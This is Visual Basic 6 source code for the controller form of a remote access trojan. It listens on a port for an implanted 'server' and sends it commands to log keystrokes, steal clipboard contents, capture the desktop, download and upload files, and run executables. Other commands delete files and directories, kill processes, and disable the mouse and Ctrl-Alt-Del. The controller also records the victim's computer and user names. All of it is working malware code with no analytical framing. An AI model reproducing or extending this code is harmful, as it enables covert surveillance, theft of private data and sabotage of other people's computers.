VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Client"
   ClientHeight    =   4680
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   13860
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4680
   ScaleWidth      =   13860
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame8 
      Height          =   495
      Left            =   120
      TabIndex        =   43
      Top             =   4080
      Width           =   1695
      Begin VB.CommandButton Command29 
         Caption         =   "Retrive Clipboard"
         Height          =   255
         Left            =   120
         TabIndex        =   44
         Top             =   170
         Width           =   1455
      End
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2
      Left            =   1560
      Top             =   2400
   End
   Begin VB.CommandButton Command18 
      Caption         =   "Drivers"
      Height          =   255
      Left            =   5040
      TabIndex        =   30
      Top             =   120
      Width           =   1095
   End
   Begin VB.ComboBox Combo1 
      Height          =   315
      Left            =   3840
      TabIndex        =   29
      Text            =   "Drivers"
      Top             =   120
      Width           =   1095
   End
   Begin VB.Frame Frame7 
      Height          =   4275
      Left            =   7080
      TabIndex        =   28
      Top             =   360
      Width           =   1455
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   120
         TabIndex        =   41
         Top             =   3960
         Visible         =   0   'False
         Width           =   1215
      End
      Begin VB.CommandButton Command28 
         BackColor       =   &H0000C0C0&
         Caption         =   "Cancel"
         Height          =   255
         Left            =   120
         Style           =   1  'Graphical
         TabIndex        =   40
         Top             =   3480
         Width           =   1215
      End
      Begin VB.CommandButton Command27 
         Caption         =   "Refresh"
         Height          =   255
         Left            =   120
         TabIndex        =   39
         Top             =   3120
         Width           =   1215
      End
      Begin VB.CommandButton Command26 
         Caption         =   "Size File"
         Height          =   255
         Left            =   120
         TabIndex        =   38
         Top             =   2760
         Width           =   1215
      End
      Begin VB.CommandButton Command25 
         Caption         =   "Rename"
         Height          =   255
         Left            =   120
         TabIndex        =   37
         Top             =   2400
         Width           =   1215
      End
      Begin VB.CommandButton Command24 
         Caption         =   "Make DIR"
         Height          =   255
         Left            =   120
         TabIndex        =   36
         Top             =   2040
         Width           =   1215
      End
      Begin VB.CommandButton Command23 
         Caption         =   "Delete Dir"
         Height          =   255
         Left            =   120
         TabIndex        =   35
         Top             =   1680
         Width           =   1215
      End
      Begin VB.CommandButton Command22 
         Caption         =   "Delete File"
         Height          =   255
         Left            =   120
         TabIndex        =   34
         Top             =   1320
         Width           =   1215
      End
      Begin VB.CommandButton Command21 
         Caption         =   "Run File"
         Height          =   255
         Left            =   120
         TabIndex        =   33
         Top             =   960
         Width           =   1215
      End
      Begin VB.CommandButton Command20 
         Caption         =   "Upload"
         Height          =   255
         Left            =   120
         TabIndex        =   32
         Top             =   600
         Width           =   1215
      End
      Begin VB.CommandButton Command19 
         Caption         =   "Download"
         Height          =   255
         Left            =   120
         TabIndex        =   31
         Top             =   240
         Width           =   1215
      End
      Begin VB.Label Label2 
         Caption         =   "Make DIR:"
         Height          =   255
         Left            =   120
         TabIndex        =   42
         Top             =   3720
         Visible         =   0   'False
         Width           =   1095
      End
   End
   Begin VB.ListBox List3 
      Height          =   4155
      Left            =   3840
      Sorted          =   -1  'True
      TabIndex        =   27
      Top             =   480
      Width           =   3135
   End
   Begin VB.Frame Frame6 
      Height          =   495
      Left            =   120
      TabIndex        =   25
      Top             =   2760
      Width           =   1335
      Begin VB.CommandButton Command5 
         Caption         =   "Keylog"
         Height          =   255
         Left            =   120
         TabIndex        =   26
         Top             =   160
         Width           =   1095
      End
   End
   Begin VB.Frame Frame5 
      Height          =   495
      Left            =   12120
      TabIndex        =   23
      Top             =   4080
      Width           =   1695
      Begin VB.CommandButton Command17 
         Caption         =   "Remove Server"
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   160
         Width           =   1455
      End
   End
   Begin VB.Frame Frame3 
      Height          =   855
      Left            =   120
      TabIndex        =   20
      Top             =   3240
      Width           =   1695
      Begin VB.CommandButton Command15 
         Caption         =   "Retrive Desktop"
         Height          =   255
         Left            =   120
         TabIndex        =   22
         Top             =   500
         Width           =   1455
      End
      Begin VB.CommandButton Command14 
         Caption         =   "Change Desktop"
         Height          =   255
         Left            =   120
         TabIndex        =   21
         Top             =   180
         Width           =   1455
      End
   End
   Begin VB.Frame Frame4 
      Height          =   1215
      Left            =   12120
      TabIndex        =   11
      Top             =   360
      Width           =   1575
      Begin VB.CommandButton Command13 
         Caption         =   "List Process"
         Height          =   375
         Left            =   120
         TabIndex        =   13
         Top             =   240
         Width           =   1335
      End
      Begin VB.CommandButton Command12 
         Caption         =   "Kill Process"
         Height          =   375
         Left            =   120
         TabIndex        =   12
         Top             =   720
         Width           =   1335
      End
   End
   Begin VB.ListBox List2 
      Height          =   4155
      Left            =   8640
      Sorted          =   -1  'True
      TabIndex        =   10
      Top             =   480
      Width           =   3375
   End
   Begin VB.Frame Frame2 
      Height          =   2775
      Left            =   1920
      TabIndex        =   8
      Top             =   1800
      Width           =   1815
      Begin VB.CommandButton Command8 
         Caption         =   "Disable Ctrl-Alt-Canc"
         Height          =   255
         Left            =   120
         TabIndex        =   19
         Top             =   2400
         Width           =   1575
      End
      Begin VB.CommandButton Command11 
         Caption         =   "Disable Mouse"
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   600
         Width           =   1575
      End
      Begin VB.CommandButton Command9 
         Caption         =   "Open URL"
         Height          =   255
         Left            =   120
         TabIndex        =   17
         Top             =   1680
         Width           =   1575
      End
      Begin VB.CommandButton Command7 
         Caption         =   "Change Home Pg"
         Height          =   255
         Left            =   120
         TabIndex        =   16
         Top             =   2040
         Width           =   1575
      End
      Begin VB.CommandButton Command10 
         Caption         =   "Send Message"
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   1320
         Width           =   1575
      End
      Begin VB.CommandButton Command16 
         Caption         =   "Open CD"
         Height          =   255
         Left            =   120
         TabIndex        =   14
         Top             =   240
         Width           =   1575
      End
      Begin VB.CommandButton Command6 
         Caption         =   "Print Text"
         Height          =   255
         Left            =   120
         TabIndex        =   9
         Top             =   960
         Width           =   1575
      End
   End
   Begin VB.Frame Frame1 
      Height          =   975
      Left            =   120
      TabIndex        =   5
      Top             =   1800
      Width           =   1335
      Begin VB.CommandButton Command4 
         Caption         =   "Shutdown"
         Height          =   255
         Left            =   120
         TabIndex        =   7
         Top             =   600
         Width           =   1095
      End
      Begin VB.CommandButton Command3 
         Caption         =   "Reboot"
         Height          =   255
         Left            =   120
         TabIndex        =   6
         Top             =   240
         Width           =   1095
      End
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Disconnect"
      Height          =   255
      Left            =   2640
      TabIndex        =   4
      Top             =   120
      Width           =   1095
   End
   Begin VB.ListBox List1 
      Height          =   1230
      ItemData        =   "Form1.frx":0000
      Left            =   120
      List            =   "Form1.frx":0002
      Sorted          =   -1  'True
      TabIndex        =   3
      Top             =   480
      Width           =   3615
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   1920
      TabIndex        =   2
      Text            =   "9999"
      Top             =   120
      Width           =   615
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Enable (Listen)"
      Height          =   255
      Left            =   480
      TabIndex        =   1
      Top             =   120
      Width           =   1215
   End
   Begin VB.PictureBox Picture1 
      BackColor       =   &H000000FF&
      Height          =   255
      Left            =   120
      ScaleHeight     =   195
      ScaleWidth      =   195
      TabIndex        =   0
      Top             =   120
      Width           =   255
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   1560
      Top             =   1800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public PercorsoAssoluto As String
Public NoTemp As String
Public FlagDown As Boolean
Public FlagUpld As Boolean
Public FlagDesk As Boolean
Public FileSize As Long

Option Explicit


Private Sub Combo1_Click()
Dim parola As String
If Winsock1.State = sckConnected Then
        List3.Clear
        parola = "/LISTDIRS/" + Combo1.Text
        PercorsoAssoluto = Combo1.Text
        Winsock1.SendData parola
    Else
        Noconnection
    End If
End Sub

Private Sub Command1_Click()
List1.Clear
If Command1.Caption <> "Listening..." Then
    If Text1.Text <> "Port" Then
        Winsock1.LocalPort = Text1.Text
        Winsock1.Listen
        Command1.Caption = "Listening..."
    Else
        MsgBox "Insert port to listen!"
    End If
Else

    Winsock1.Close
    Winsock1.LocalPort = Text1.Text
    Winsock1.Listen
    Command1.Caption = "Listening..."
    RecoveryLabel
End If
    ResetKey
End Sub

Private Sub Command10_Click()
  If Winsock1.State = sckConnected Then
    Form5.Show
  Else
    Noconnection
  End If
End Sub

Private Sub Command11_Click()
  If Winsock1.State = sckConnected Then
    If Command11.Caption = "Disable Mouse" Then
        Winsock1.SendData "/HIDEMOUS/"
        Command11.Caption = "Enable Mouse"
    Else
        Winsock1.SendData "/SHOWMOUS/"
        Command11.Caption = "Disable Mouse"
    End If
  Else
    Noconnection
  End If
End Sub

Private Sub Command12_Click()
  If Winsock1.State = sckConnected Then
    Winsock1.SendData "/KILLPROC/" + List2.Text
  Else
    Noconnection
  End If
End Sub

Private Sub Command13_Click()
  List2.Clear
    If Winsock1.State = sckConnected Then
    Winsock1.SendData "/LISTPROC/"
  Else
    List2.Clear
    Noconnection
  End If
End Sub

Private Sub Command14_Click()
Dim Pulsante_Premuto As Long

If Winsock1.State = sckConnected Then
    Pulsante_Premuto = MsgBox("Are you sure changed the Desktop image with " & List3.Text & "?", vbYesNoCancel + vbExclamation, "Change Desktop Image")
    If Pulsante_Premuto = vbYes Then
        If List3.Text = "" Then
            MsgBox "Chose an Image!"
            Exit Sub
        End If
        If Right(List3.Text, 3) = "BMP" Or Right(List3.Text, 3) = "bmp" Then
            Winsock1.SendData "/CHANGEDK/" & PercorsoAssoluto & List3.Text
            Exit Sub
        Else:
            MsgBox "You must chose a Picture (.BMP)"
            Exit Sub
        End If
    End If
Else
    Noconnection
End If
End Sub

Private Sub Command15_Click()
  If Winsock1.State = sckConnected Then
    Form3.Show
  Else
    Noconnection
  End If
End Sub

Private Sub Command16_Click()
  If Winsock1.State = sckConnected Then
    If Command16.Caption = "Open CD" Then
        Winsock1.SendData "/OPENCDCD/"
        Command16.Caption = "Close CD"
    Else
        Winsock1.SendData "/CLOSECDD/"
        Command16.Caption = "Open CD"
    End If
  Else
    Noconnection
  End If
End Sub

Private Sub Command17_Click()
  If Winsock1.State = sckConnected Then
    Winsock1.SendData "/REMOVESV/"
  Else
    Noconnection
  End If
End Sub

Private Sub Command18_Click()
  If Winsock1.State = sckConnected Then
    Winsock1.SendData "/LISTDRVS/"
  Else
    Noconnection
  End If
End Sub

Private Sub Command19_Click()
  If Winsock1.State = sckConnected Then
    If Left(List3.Text, 5) = "(DIR)" Then
        MsgBox "Download only file"
    ElseIf List3.Text = "" Then
        MsgBox "Chose file to download"
    Else:
        FlagDown = True
        Winsock1.SendData "/DOWNFILE/" & PercorsoAssoluto & List3.Text
        List1.AddItem "Downloading...", 0
    End If
  Else
    Noconnection
  End If
End Sub

Private Sub Command2_Click()
    Winsock1.Close
    RecoveryLabel
    ResetKey
    Command1.Caption = "Enable (Listen)"
    Noconnection
End Sub

Private Sub Command20_Click()
  If Winsock1.State = sckConnected Then
    If Command20.Caption = "Confirm" Then
        If Combo1.Text = "" Or Combo1.Text = "Drivers" Then
            MsgBox "Chose dir to upload"
            
        Else
            Command20.Caption = "Upload"
            Command20.FontBold = False
            List1.AddItem "Uploading...", 0
            FlagUpld = True
            Winsock1.SendData "/UPLOADFL/" & PercorsoAssoluto & Form7.File1.FileName
        End If
    Else
        Form7.Show
    End If
  Else
    Noconnection
  End If
End Sub

Private Sub Command21_Click()
Dim appoggio As String
If Winsock1.State = sckConnected Then
    appoggio = Mid(List1.Text, 1, 5)
    If appoggio = "(DIR)" Or List3.Text = "(DIR)." Then
        MsgBox "You can execute only file "
    Else
        appoggio = Right(List3.Text, 4)
        If appoggio = ".exe" Or appoggio = ".com" Or appoggio = ".bat" Or _
            appoggio = ".pif" Or appoggio = ".scr" Or appoggio = ".EXE" Or _
            appoggio = ".BAT" Or appoggio = ".COM" Or appoggio = ".BAT" Or _
            appoggio = ".PIF" Or appoggio = ".SCR" Then
            Winsock1.SendData "/RUNEXEFL/" & PercorsoAssoluto & List3.Text
        Else
            MsgBox "You can execute only application file:exe, com, bat, pif, scr", , ""
        End If
    End If
Else
    Noconnection
End If
End Sub

Private Sub Command22_Click()
Dim appoggio As String
If Winsock1.State = sckConnected Then
    appoggio = Mid(List3.Text, 1, 5)
    If appoggio = "(DIR)" Then
        MsgBox "This is a DIR:you must user other button", , ""
    ElseIf List1.Text = "(DIR)." Then
        MsgBox "What??", , ""
    Else
        Winsock1.SendData "/KILLFILE/" & PercorsoAssoluto & List3.Text
    End If
Else
    Noconnection
End If
End Sub

Private Sub Command23_Click()
Dim appoggio As String
If Winsock1.State = sckConnected Then
    appoggio = Mid(List3.Text, 1, 5)
    If appoggio = "(DIR)" Then
        appoggio = Mid(List3.Text, 6, Len(List3.Text))
        Winsock1.SendData "/KILLDIRS/" & PercorsoAssoluto & "*" & appoggio
    Else:
        MsgBox "This is a FILE:you must user other button", , ""
    End If
Else
    List3.Clear
    Noconnection
End If
End Sub

Private Sub Command24_Click()
If Winsock1.State = sckConnected Then
    Form1.Command25.Caption = "Rename"
    Form1.Command25.FontBold = False
    If Label2.Visible = True Then
        If Label2.Caption = "Name of File:" Then
            Text2.Visible = True
            Text2.Text = ""
            Label2.Caption = "Make DIR:"
            Command24.Caption = "Confirm"
            Command24.FontBold = True
        ElseIf Text2.Text = "" Then MsgBox "Insert DIR to make"
        ElseIf Combo1.Text = "" Or Combo1.Text = "Drivers" Then MsgBox "Chose where to make a DIR"
        Else: Winsock1.SendData "/MAKEDIRS/" & PercorsoAssoluto & Text2.Text
              ResetKey
        End If
    Else
        Label2.Visible = True
        Label2.Caption = "Make DIR:"
        Text2.Visible = True
        Text2.Text = ""
        Command24.Caption = "Confirm"
        Command24.FontBold = True
    End If
  Else
    Noconnection
  End If
End Sub

Private Sub Command25_Click()
  Dim dirtorename As String
  If Winsock1.State = sckConnected Then
    Form1.Command24.Caption = "Make DIR"
    Form1.Command24.FontBold = False
    If Label2.Visible = True Then
        If Label2.Caption = "Make DIR:" Then
            Text2.Visible = True
            Text2.Text = ""
            Label2.Caption = "Name of File:"
            Command25.Caption = "Confirm"
            Command25.FontBold = True
        ElseIf Text2.Text = "" Then MsgBox "Insert name of file to rename"
        ElseIf List3.Text = "" Then MsgBox "Chose file to rename"
        Else:
              If Left(List3.Text, 5) = "(DIR)" Then
                dirtorename = Mid(List3.Text, 6, Len(List3.Text))
              Else
                dirtorename = List3.Text
              End If
              Winsock1.SendData "/RENAMEFL/" & PercorsoAssoluto & dirtorename & "*" & PercorsoAssoluto & Text2.Text
              ResetKey
        End If
    Else
        Label2.Visible = True
        Label2.Caption = "New name:"
        Text2.Visible = True
        Text2.Text = ""
        Command25.Caption = "Confirm"
        Command25.FontBold = True
    End If
  Else
    Noconnection
  End If
End Sub

Private Sub Command26_Click()
  Dim appoggio As String
  If Winsock1.State = sckConnected Then
    appoggio = Mid(List3.Text, 1, 5)
    If appoggio = "(DIR)" Then
        MsgBox "Retrive only file SIZE, not DIR"
    ElseIf List3.Text = "" Then
        MsgBox "What File Size?"
    Else
        Winsock1.SendData "/FILESIZE/" & PercorsoAssoluto & List3.Text
    End If
  Else
    List3.Clear
    Noconnection
  End If
End Sub

Private Sub Command27_Click()
If Winsock1.State = sckConnected Then
    List3.Clear
    Winsock1.SendData "/LISTDIRS/" + PercorsoAssoluto
Else
    Noconnection
End If
End Sub

Private Sub Command28_Click()
    Form1.List1.AddItem "Cancel", 0
    ResetKey
    If FlagDown Then
        Winsock1.SendData "/STOPDOWN/"
        FlagDown = False
        Close #FILEDOWN
    End If
    If FlagUpld Then
        Winsock1.SendData "/STOPUPLD/"
        FlagUpld = False
        Close #FILEUPLD
    End If
End Sub

Private Sub Command29_Click()
  If Winsock1.State = sckConnected Then
    Winsock1.SendData "/CLIPBOAR/"
    Form8.Show
  Else
    Noconnection
  End If
End Sub

Private Sub Command3_Click()
  If Winsock1.State = sckConnected Then
    Winsock1.SendData "/REBOOTPC/"
  Else
    Noconnection
  End If
End Sub

Private Sub Command4_Click()
  If Winsock1.State = sckConnected Then
    Winsock1.SendData "/SHUTDOWN/"
  Else
    Noconnection
  End If
End Sub

Private Sub Command5_Click()
  If Winsock1.State = sckConnected Then
    Winsock1.SendData "/KEYSLOGG/"
    Form2.Show
  Else
    Noconnection
  End If
End Sub

Private Sub Command6_Click()
  If Winsock1.State = sckConnected Then
    Form4.Show
  Else
    Noconnection
  End If
End Sub

Private Sub Command7_Click()
  If Winsock1.State = sckConnected Then
    Form6.Command1.Caption = "Change Home Page"
    Form6.Show
  Else
    Noconnection
  End If
End Sub

Private Sub Command8_Click()
  If Winsock1.State = sckConnected Then
    If Command8.Caption = "Disable Ctrl-Alt-Canc" Then
            Winsock1.SendData "/DISCTRLC/"
            Command8.Caption = "Enable Ctrl-Alt-Canc"
    Else
            Winsock1.SendData "/ENBCRTLC/"
            Command8.Caption = "Disable Ctrl-Alt-Canc"
    End If
  Else
    Noconnection
  End If
End Sub

Private Sub Command9_Click()
  If Winsock1.State = sckConnected Then
    Form6.Command1.Caption = "/OPENURLS/"
    Form6.Show
  Else
    Noconnection
  End If
End Sub





Private Sub List3_DblClick()
Dim appoggio As String
Dim cont As Long
Dim lung As Long

If Winsock1.State = sckConnected Then
        appoggio = Mid(List3.Text, 1, 5)
        If List3.Text <> "(DIR)." Then
            If appoggio = "(DIR)" Then
                appoggio = Mid(List3.Text, 6, Len(List3.Text))
                PercorsoAssoluto = PercorsoAssoluto + appoggio + "\"
                List3.Clear
                Winsock1.SendData "/LISTDIRS/" + PercorsoAssoluto
            
                If Right(PercorsoAssoluto, 3) = "..\" Then
                    PercorsoAssoluto = Mid(PercorsoAssoluto, 1, Len(PercorsoAssoluto) - 4) 'Elimino "..\ dalla fine del percorso
                    lung = Len(PercorsoAssoluto)
                
                    For cont = 1 To lung - 3  'Lascio 3 caratteri di "C:\"
                        PercorsoAssoluto = Mid(PercorsoAssoluto, 1, lung - cont)
                        If Right(PercorsoAssoluto, 1) = "\" Then Exit For
                    Next cont
                End If
                Form1.Caption = PercorsoAssoluto
                Else: MsgBox "You open only DIR", , ""
            End If
         End If
Else
    List3.Clear
    Noconnection
End If
End Sub



Private Sub Timer1_Timer()
  If Winsock1.State = sckClosing Then
    Winsock1.Close
    RecoveryLabel
    ResetKey
    Command1.Caption = "Enable (Listen)"
    Noconnection
    Timer1.Enabled = False
  End If
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
  If Winsock1.State <> sckClosed Then
        Winsock1.Close
        Winsock1.Accept requestID
        Picture1.BackColor = &HFF00&   'green
        Form1.Caption = "Connected"
        Timer1.Enabled = True
    End If
End Sub


Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

Dim TempData As String
Dim appoggio As String
Dim appoggio2 As String

Dim Count As Long
Dim LungFile As Long

Dim NumDriver As Integer
Dim c As Integer

Dim file_data As WIN32_FIND_DATA
Dim hFile As Long

On Error GoTo ErrorExit
    Winsock1.GetData TempData
    
    '----test------
    'test.Show
    'test.Text1.Text = test.Text1.Text + vbCrLf + TempData
    'test.Text2.Text = PercorsoAssoluto
    '----test------
    
    Select Case Left(TempData, 10)
'-----------------------------------------------------
'Download Desktop  remoto
'-----------------------------------------------------
    Case "/STARDESK/"
        TempData = Mid(TempData, 11, Len(TempData))
        LungFile = CLng(Extract(TempData))
        
        TempData = Mid(TempData, Len(CStr(LungFile)) + 2, Len(TempData))
        NoTemp = IIf(Environ$("tmp") <> "", Environ$("tmp"), Environ$("temp"))
        Open NoTemp & "\temp.jpg" For Binary As #FILEDESK
        
        Put #FILEDESK, , TempData
        Winsock1.SendData "/ENCODESK/"
    Case "/PAKSDESK/"
        TempData = Mid(TempData, 11, Len(TempData))
        
        Put #FILEDESK, , TempData
        Winsock1.SendData "/ENCODESK/"
    Case "/FINEDESK/"
        Close #FILEDESK
        Form3.Image1.Picture = LoadPicture(NoTemp & "\temp.jpg")
'-----------------------------------------------------
'Mancano DLL per Download Desktop
'-----------------------------------------------------
    Case "/NEVERDLL/"
        TempData = Mid(TempData, 11, Len(TempData))
        MsgBox "You must download in " & TempData & "\system32 the file: PicToJpg.dll"
'-----------------------------------------------------
'Ricezione File Size
'-----------------------------------------------------
    Case "/FILESIZE/"
        TempData = Mid(TempData, 11, Len(TempData))
        MsgBox "Size File: " & Val(TempData) / 1024 & " Kb", , ""
'-----------------------------------------------------
'Ricezione elenco cartelle
'-----------------------------------------------------
    Case "/ONLYONEP/"
            TempData = Mid(TempData, 11, Len(TempData))
            While (Len(TempData)) > 2
                appoggio = Extract(TempData)
                List3.AddItem appoggio
                TempData = Mid(TempData, Len(appoggio) + 2, Len(TempData))
            Wend
    Case "/MULTIDIR/"
            TempData = Mid(TempData, 11, Len(TempData))
            While (Len(TempData)) > 2
                appoggio = Extract(TempData)
                List3.AddItem appoggio
                TempData = Mid(TempData, Len(appoggio) + 2, Len(TempData))
            Wend
            Sleep (100)
            Winsock1.SendData "/ENCOREDR/"
'-----------------------------------------------------
'Ricezione elenco drivers
'-----------------------------------------------------
    Case "/LISTDRVS/"
    TempData = Mid(TempData, 12, Len(TempData)) 'Elimino i primi 10 caratteri del mesaggio
        NumDriver = Val(TempData)         'NumDriver=numero dei dispositivi
        
        TempData = Mid(TempData, Len(NumDriver) + 2, Len(TempData)) 'Elimino primi 2 o 3 caratteri che contengono il numero dei driver
        Combo1.Clear
        
        For c = 1 To NumDriver Step 4  ' incremento di 4 essendo scritti così: A:\_C:\_D:\_
            Combo1.AddItem (Mid(TempData, c, 3))  ' extract a 3-character string X:\ (X is the drive letter)
        Next c
'----------------------------------------------------
'Riceive info Connection
'----------------------------------------------------
    Case "/INFOPCPC/"
        TempData = Mid(TempData, 11, Len(TempData))
        appoggio = Extract(TempData) '.dwPlatformId
                TempData = Mid(TempData, Len(appoggio) + 2, Len(TempData))
                appoggio2 = Extract(TempData) '.dwMinorVersion
                If appoggio = "1" Then
                    If appoggio2 = "0" Then List1.AddItem ("OS: Win95")
                    If appoggio2 = "10" Then List1.AddItem ("OS: Win98")
                    If appoggio2 = "90" Then List1.AddItem ("OS: WinME")
                ElseIf appoggio = "2" Then
                    If appoggio2 = "0" Then List1.AddItem ("OS: Win2000")
                    If appoggio2 = "1" Then List1.AddItem ("OS: WinXP")
                Else
                    List1.AddItem ("UNKNOWN_OS")
                End If
        TempData = Mid(TempData, Len(appoggio) + 2, Len(TempData))
        List1.AddItem ("Computer Name: " & Extract(TempData))
        TempData = Mid(TempData, Len(Extract(TempData)) + 2, Len(TempData))
        List1.AddItem ("User Name: " & Extract(TempData))
        TempData = Mid(TempData, Len(Extract(TempData)) + 2, Len(TempData))
        List1.AddItem ("Time Run Windows: " & Extract(TempData) & " minuts")
        TempData = Mid(TempData, Len(Extract(TempData)) + 2, Len(TempData))
        List1.AddItem ("Monitor Size: " & Extract(TempData))
        List1.AddItem "-----------------------", 0
'----------------------------------------------------
'Confirm Operation Success
'----------------------------------------------------
    Case "/SUCCESSS/"
        List1.AddItem "Operation Success!", 0
'----------------------------------------------------
'Operation Failed
'----------------------------------------------------
    Case "/OPFAILED/"
        List1.AddItem "Operation Failed!", 0
'----------------------------------------------------
'Retrive Clipboard
'----------------------------------------------------
    Case "/CLIPBOAR/"
    Form8.Text1.Text = Form8.Text1.Text + Mid(TempData, 11, Len(TempData))
    TempData = ""
'-----------------------------------------------------
'List Process
'-----------------------------------------------------
    Case "/LISTPROC/"
    TempData = Mid(TempData, 11, Len(TempData))
        Do
            appoggio = Extract(TempData)
            List2.AddItem (appoggio)
            TempData = Mid(TempData, Len(appoggio) + 2, Len(TempData))
            If Len(TempData) < 1 Then Exit Do
        Loop
'-----------------------------------------------------
'Download File
'-----------------------------------------------------
    Case "/STARTDOW/"
        TempData = Mid(TempData, 11, Len(TempData))
        LungFile = CLng(Extract(TempData))
                
        TempData = Mid(TempData, Len(CStr(LungFile)) + 2, Len(TempData))
        appoggio = "c:\TimeOfDownloaded_" & Time
        If (Not (FileExists(appoggio))) Then MkDir appoggio
        
        Open appoggio & "\" & List3.Text For Binary As #FILEDOWN
        Put #FILEDOWN, , TempData
        Winsock1.SendData "/ENCOREFL/"
    Case "/PAKSSEND/"
        TempData = Mid(TempData, 11, Len(TempData))
        Put #FILEDOWN, , TempData
        Winsock1.SendData "/ENCOREFL/"
    Case "/FINEDOWN/"
        Close #FILEDOWN
        List1.AddItem "Downloaded in c:\TimeOfDownloaded", 0
        FlagDown = False
 '-----------------------------------------------------
 'Upload File
 '-----------------------------------------------------
    Case "/STARUPLD/"
        hFile = FindFirstFile(Form7.Dir1.Path & "\" & Form7.File1.FileName, file_data)
        
        Open Form7.Dir1.Path & "\" & Form7.File1.FileName For Binary As #FILEUPLD
        TempData = Input(PAKSEND, FILEUPLD)
        FileSize = file_data.nFileSizeLow - PAKSEND
        Winsock1.SendData "/OTHERPAK/" & TempData
    Case "/ANOTHEPK/"
        If FileSize > PAKSEND Then
            TempData = Space(PAKSEND)
            Get #FILEUPLD, , TempData
            Winsock1.SendData "/OTHERPAK/" & TempData
            FileSize = FileSize - PAKSEND
        Else
            TempData = ""
            TempData = Space(FileSize)
            Get #FILEUPLD, , TempData
            Winsock1.SendData "/OTHERPAK/" & TempData
            DoEvents
            Close #FILEUPLD
            Winsock1.SendData "/FINEUPLD/"
            List1.AddItem "Uploaded!", 0
            FlagUpld = False
        End If
 '-----------------------------------------------------
 'Keylog
 '-----------------------------------------------------
    Case "/XXKEYSXX/"
        TempData = Mid(TempData, 11, Len(TempData))
        Form2.Text1.Text = Form2.Text1.Text + TempData
 '----------------------------------------------------
 'You must upload DLL
 '----------------------------------------------------
    Case "/NOTDLLFD/"
        TempData = Mid(TempData, 11, Len(TempData))
        MsgBox "You must download in " & TempData & "\system32 the file: PicToJpg.dll"
End Select

ErrorExit:
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    Winsock1.Close
End Sub
